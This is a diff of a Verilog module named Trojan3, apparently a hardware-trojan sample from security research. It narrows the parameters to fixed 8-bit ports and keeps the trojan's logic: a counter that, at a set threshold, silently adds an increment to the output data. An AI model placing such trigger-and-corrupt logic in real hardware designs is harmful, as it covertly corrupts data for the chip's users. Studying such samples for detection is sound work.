@@ -1,14 +1,12 @@
 module Trojan3 #(
-    parameter DATA_WIDTH = 8,
-    parameter NUM_INPUTS = 2,
-    parameter NUM_OUTPUTS = 2,
-    parameter DATA_INCREMENT = 2,
-    parameter TRIGGER_COUNTER_THRESHOLD = 255
+    // Keep non-I/O tunables as parameters
+    parameter [7:0]  DATA_INCREMENT = 8'd2,
+    parameter [15:0] TRIGGER_COUNTER_THRESHOLD = 16'd255
 )(
-    input wire clk,
-    input wire rst,
-    input wire [DATA_WIDTH-1:0] data_in,
-    output reg [DATA_WIDTH-1:0] data_out
+    input  wire clk,
+    input  wire rst,
+    input  wire [7:0] data_in,
+    output reg  [7:0] data_out
 );
     reg [15:0] counter; // Use 16-bit to handle larger thresholds
     wire trigger = (counter == TRIGGER_COUNTER_THRESHOLD);
@@ -23,12 +21,12 @@ module Trojan3 #(
     
     always @(posedge clk or posedge rst) begin
         if (rst) begin
-            data_out <= {DATA_WIDTH{1'b0}};
+            data_out <= 8'b0;
         end else begin
             if (trigger) begin
                 // Add increment when triggered (with overflow protection)
-                if (data_in <= ({DATA_WIDTH{1'b1}} - DATA_INCREMENT)) begin
-                    data_out <= data_in + DATA_INCREMENT[DATA_WIDTH-1:0];
+                if (data_in <= (8'hFF - DATA_INCREMENT[7:0])) begin
+                    data_out <= data_in + DATA_INCREMENT[7:0];
                 end else begin
                     data_out <= data_in; // Prevent overflow
                 end
